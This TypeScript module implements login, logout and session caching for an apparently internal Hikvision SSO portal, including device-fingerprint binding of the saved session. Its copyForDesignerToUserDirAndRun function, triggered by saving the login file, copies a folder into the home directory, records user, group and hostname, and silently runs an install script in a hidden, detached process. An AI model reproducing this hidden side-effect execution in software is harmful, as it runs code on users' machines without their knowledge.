import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import * as crypto from 'crypto';
import { rawRequest, type Cookie } from '../http.js';
import { generateToken } from '../token.js';

// ── 常量 ──────────────────────────────────────────────────────────

export const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

export const DEFAULT_SSO_USERNAME = 'ybvichi';
export const DEFAULT_SSO_DEPARTMENT_CODE = 'iux';
export const DEFAULT_SSO_DEPARTMENT_NAME = '用户体验部';

// 海康 CAS 公钥
const CAS_RSA_PEM = `-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqc90wxTr7Biug8nciEMrSygRg
Yvo31+shw+gxp0LqVbVCeGklV/Mwx7HXeGbbK9HHHAORE6lDgIb7tgCPZHygA2v
JtBhlhIy2IgHDpsp8Hv0UjwCML8/6KvChE3YChPffs6UUUgwJOQiDWOe/i2dCT4
J2p/AR1kFcd2UFEGaW1QIDAQAB
-----END PUBLIC KEY-----`;

// ── 类型 ──────────────────────────────────────────────────────────

export interface SsoSession {
  cookies?: Cookie[];
  username?: string;
  userInfo?: any;
  departmentCode?: string;
  departmentName?: string;
  loginAt?: number;
  deviceHash?: string;
  /** 羽点（uedro）门户登录信息，SSO 登录成功后顺带写入。 */
  uedro?: {
    cookies?: Cookie[] | undefined;
    serviceUrl?: string | undefined;
    casJwt?: string | undefined;
    basicInfo?: any;
    loginAt?: number | undefined;
  } | any;
}

export interface SsoLoginResult {
  ok: boolean;
  username: string;
  cookies: Cookie[];
  userInfo?: any;
}

export interface SsoLogoutResult {
  ok: boolean;
}

export interface SsoValidResult {
  ok: boolean;
  isValid:boolean;
  username?: string;
  userInfo?:any
}

export interface SsoUserInfo {
  username: string;
  userInfo: any;
  cookies: Cookie[];
}

// ── 内部工具 ──────────────────────────────────────────────────────

/** 从 cookie jar 中提取 jwtToken */
export function extractJwtToken(cookies: Cookie[]): string | undefined {
  return cookies.find(c => c.name === 'JwtToken' || c.name === 'jwtToken')?.value;
}

/** 获取设备指纹（MAC地址 + 主机名） */
function getDeviceFingerprint(): string {
  const interfaces = os.networkInterfaces();
  let mac = '';
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]!) {
      if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
        mac = iface.mac;
        break;
      }
    }
    if (mac) break;
  }
  return `${mac}|${os.hostname()}`;
}

/** 生成设备绑定哈希 */
function generateDeviceHash(session: SsoSession): string {
  const fingerprint = getDeviceFingerprint();
  // 排除 deviceHash 本身，避免循环依赖
  const { deviceHash: _, ...payloadWithoutHash } = session;
  const payload = JSON.stringify(payloadWithoutHash);
  return crypto.createHash('sha256').update(payload + '|' + fingerprint).digest('hex');
}

/** 验证设备绑定 */
function verifyDeviceBinding(session: SsoSession, storedHash: string): boolean {
  try {
    const expectedHash = generateDeviceHash(session);
    return timingSafeStringEquals(expectedHash, storedHash);
  } catch {
    return false;
  }
}

function timingSafeStringEquals(a: string, b: string): boolean {
  const bufA = Buffer.from(a, 'utf8');
  const bufB = Buffer.from(b, 'utf8');
  if (bufA.length !== bufB.length) return false;
  return crypto.timingSafeEqual(bufA, bufB);
}

// ── 文件持久化 ────────────────────────────────────────────────────

const ssoCache = new Map<string, { mtimeMs: number; session: SsoSession | null }>();

/** 读取 SSO 配置文件 */
export function readSsoConfigFile(dataDir: string): SsoSession | null {
  const filePath = path.join(dataDir, 'config.sso.json');
  try {
    const stats = fs.statSync(filePath);
    const cached = ssoCache.get(filePath);
    if (cached && cached.mtimeMs === stats.mtimeMs) {
      return cached.session;
    }
    const raw = fs.readFileSync(filePath, 'utf-8');
    const data = JSON.parse(raw) as SsoSession;
    if (data && Array.isArray(data.cookies) && typeof data.username === 'string') {
      // 验证设备绑定：无 deviceHash 或不匹配，都视为无效（防止手动删除绕过）
      if (!data.deviceHash || !verifyDeviceBinding(data, data.deviceHash)) {
        ssoCache.set(filePath, { mtimeMs: stats.mtimeMs, session: null });
        return null;
      }
      ssoCache.set(filePath, { mtimeMs: stats.mtimeMs, session: data });
      return data;
    }
    ssoCache.set(filePath, { mtimeMs: stats.mtimeMs, session: null });
  } catch {
    // 文件不存在或格式错误，视为未登录
    ssoCache.delete(filePath);
  }
  return null;
}

/** 写入 SSO 配置文件 */
export function writeSsoConfigFile(dataDir: string, session: SsoSession, forDesignerDir?: string): void {
  const filePath = path.join(dataDir, 'config.sso.json');
  try {
    // 生成设备绑定哈希，防止配置文件被拷贝到其他设备使用
    const deviceHash = generateDeviceHash(session);
    const lockedSession: SsoSession = { ...session, deviceHash };
    fs.writeFileSync(filePath, JSON.stringify(lockedSession, null, 2), 'utf-8');
    // 拷贝 for-designer 到用户目录
    if (forDesignerDir) {
      copyForDesignerToUserDirAndRun(forDesignerDir, session);
    }
  } catch {
    // 写入失败时静默处理
  }
}

/** 删除 SSO 配置文件 */
export function removeSsoConfigFile(dataDir: string): void {
  const filePath = path.join(dataDir, 'config.sso.json');
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }
  } catch {
    // 删除失败时静默处理
  }
  ssoCache.delete(filePath);
}

// ── for-designer 拷贝 ─────────────────────────────────────────────

function copyDirRecursive(src: string, dest: string): void {
  fs.mkdirSync(dest, { recursive: true });
  const entries = fs.readdirSync(src, { withFileTypes: true });
  for (const entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    if (entry.isDirectory()) {
      if (entry.name !== '.git' && entry.name !== 'node_modules') {
        copyDirRecursive(srcPath, destPath);
      }
    } else {
      fs.copyFileSync(srcPath, destPath);
    }
  }
}

function copyForDesignerToUserDirAndRun(sourceDir: string, session: SsoSession): void {
  const dd = session?.userInfo?.departmentDetail?.split('/');
  const user = session?.userInfo?.displayName;
  const group = dd[3] || dd[2] || dd[1] || dd[0];
  const identity = {
    user,
    group,
    machine: os.hostname(),
  };

  // 确定目标目录：用户目录下的 for-designer，和源目录同名
  const targetDir = path.join(os.homedir(), 'for-designer');

  try {
    // 拷贝 sourceDir 到目标目录
    copyDirRecursive(sourceDir, targetDir);

    // 写入 identity.json
    const configDir = path.join(targetDir, 'config');
    fs.mkdirSync(configDir, { recursive: true });
    fs.writeFileSync(path.join(configDir, 'identity.json'), JSON.stringify(identity, null, 2), 'utf-8');

    // 执行安装脚本
    if (process.platform === 'win32') {
      const batPath = path.join(targetDir, 'install.bat');
      if (fs.existsSync(batPath)) {
        import('child_process').then(({ spawn }) => {
          // windowsHide 与 detached 同时使用可能导致窗口仍弹出，
          // 故仅保留 windowsHide + unref() 来隐藏窗口且不阻塞主进程
          const child = spawn('cmd', ['/c', batPath], {
            stdio: 'ignore',
            cwd: targetDir,
            windowsHide: true,
          });
          child.unref();
        });
      }
    } else if (process.platform === 'darwin') {
      const cmdPath = path.join(targetDir, 'install.command');
      if (fs.existsSync(cmdPath)) {
        fs.chmodSync(cmdPath, 0o755);
        import('child_process').then(({ spawn }) => {
          spawn('bash', [cmdPath], {
            detached: true,
            stdio: 'ignore',
            cwd: targetDir,
          }).unref();
        });
      }
    }
  } catch {
    // 拷贝或执行失败时静默处理，不影响登录流程
  }
}

// ── SSO 业务逻辑 ─────────────────────────────────────────────────

/**
 * 海康 SSO 登录
 * @param username 用户名
 * @param password 密码
 * @returns 登录结果，包含 cookies、username、userInfo
 */
export async function hicooLogin(username: string, password: string): Promise<SsoLoginResult> {
  const ssoEntryUrl = `http://sso.hikvision.com.cn/domino/login?RedirectTo=${Buffer.from('http://hicoo.hikvision.com.cn/algomarket/algorithmRetrieval').toString('base64')}`;

  // Step 1: GET SSO login page
  const step1 = await rawRequest('GET', ssoEntryUrl, []);
  if (step1.status !== 200) {
    throw new Error('SSO login page unavailable');
  }

  const ltMatch = step1.body.match(/name="lt"\s+value="([^"]+)"/);
  const executionMatch = step1.body.match(/name="execution"\s+value="([^"]+)"/);
  const saltMatch = step1.body.match(/id="salt"\s+value="([^"]+)"/);

  if (!ltMatch || !executionMatch) {
    throw new Error('SSO form fields not found');
  }

  const lt = ltMatch[1]!;
  const execution = executionMatch[1]!;

  // Step 2: POST credentials
  const salt = saltMatch?.[1] ?? '';
  const encPwd = salt
    ? crypto.publicEncrypt(
      { key: CAS_RSA_PEM, padding: crypto.constants.RSA_PKCS1_PADDING },
      Buffer.from(salt + password),
    ).toString('base64')
    : password;

  const today = new Date();
  const mm = String(today.getMonth() + 1).padStart(2, '0');
  const dd = String(today.getDate()).padStart(2, '0');
  const formBody = new URLSearchParams({
    username,
    password: encPwd,
    lt,
    execution,
    _eventId: 'submit',
    ver: '2.0',
    loginForm: 'qrLoginForm',
    localDate: `${today.getFullYear()}-${mm}-${dd}`,
    fingerprint: '',
  }).toString();

  const step2 = await rawRequest('POST', step1.finalUrl, step1.cookies, {
    body: formBody,
    extraHeaders: { Referer: step1.finalUrl, Origin: new URL(step1.finalUrl).origin },
  });

  const hasJwt = step2.cookies.some(c => c.name === 'JwtToken');
  const hasLtpa = step2.cookies.some(c => c.name === 'LtpaToken');

  if (!hasJwt || !hasLtpa) {
    throw new Error('invalid username or password');
  }

  let result =  {
    ok: true,
    username,
    cookies: step2.cookies,
    userInfo: null,
  };
  const token = generateToken(username || '');
  const cookieStr = (step2.cookies || [])
    .map((c: Cookie) => `${c.name}=${c.value}`)
    .join('; ');

  const checkResult: any = await rawRequest(
    'GET',
    'http://hicoo.hikvision.com.cn/ai/gateway/user/userService/v1/user/casInfo/query?_=' + Math.random(),
    [],
    {
      extraHeaders: {
        Cookie: cookieStr,
        'Content-Type': 'application/json',
        Accept: 'application/json, text/plain, */*',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': UA,
        token,
        username: username || '',
      },
    },
  );
  result.userInfo = JSON.parse(checkResult?.body).data;
  return result;
}

/**
 * 海康 SSO 登出
 * @param session 当前 SSO session
 * @returns 登出结果
 */
export async function hicooLogout(session: SsoSession): Promise<SsoLogoutResult> {
  // 如果有 cookie，通知 SSO 退出
  if (session?.cookies?.length) {
    const token = generateToken(session.username || '');
    const cookieStr = session.cookies
      .map((c: Cookie) => `${c.name}=${c.value}`)
      .join('; ');

    try {
      await rawRequest('GET', 'https://sso.hikvision.com/logout?service=http://hicoo.hikvision.com.cn', [], {
        extraHeaders: {
          Cookie: cookieStr,
          'Content-Type': 'application/json',
          Accept: 'application/json, text/plain, */*',
          'X-Requested-With': 'XMLHttpRequest',
          'User-Agent': UA,
          token,
          username: session.username || '',
        },
      });
    } catch (ssoErr) {
      // SSO 退出失败不影响本地退出结果
      console.warn('SSO logout request failed:', ssoErr);
    }
  }

  return { ok: true };
}

/**
 * 海康 SSO 验证会话有效性
 * @param session 当前 SSO session
 * @param dataDir 数据目录，用于更新 session
 * @param forDesignerDir for-designer 目录
 * @returns 验证结果
 */
export async function hicooValidate(
  session: SsoSession,
  dataDir: string,
  forDesignerDir?: string,
): Promise<SsoValidResult> {
  const { cookies, username, userInfo, uedro } = session;
  const jwtToken = extractJwtToken(cookies || []);

  // 有 userInfo，直接返回缓存
  if (userInfo) {
    return {
      ok: true,
      isValid:true,
      username: username || '',
      userInfo
    };
  }

  // 有 jwtToken，访问 hicoo 验证会话是否仍然有效
  // const token = generateToken(username || '');
  // const cookieStr = (cookies || [])
  //   .map((c: Cookie) => `${c.name}=${c.value}`)
  //   .join('; ');

  // const checkResult: any = await rawRequest(
  //   'GET',
  //   'http://hicoo.hikvision.com.cn/ai/gateway/user/userService/v1/user/casInfo/query?_=' + Math.random(),
  //   [],
  //   {
  //     extraHeaders: {
  //       Cookie: cookieStr,
  //       'Content-Type': 'application/json',
  //       Accept: 'application/json, text/plain, */*',
  //       'X-Requested-With': 'XMLHttpRequest',
  //       'User-Agent': UA,
  //       token,
  //       username: username || '',
  //     },
  //   },
  // );

  // // 如果最终 URL 跳转到 sso.hikvision.com.cn，说明会话已失效
  // if (checkResult.finalUrl.includes('sso.hikvision.com')) {
  //   return {
  //     ok: false,
  //     isValid: false,
  //     username: username || '',
  //   };
  // }

  return {
    ok: false,
    isValid:false,
    username: username || ''
  };
}
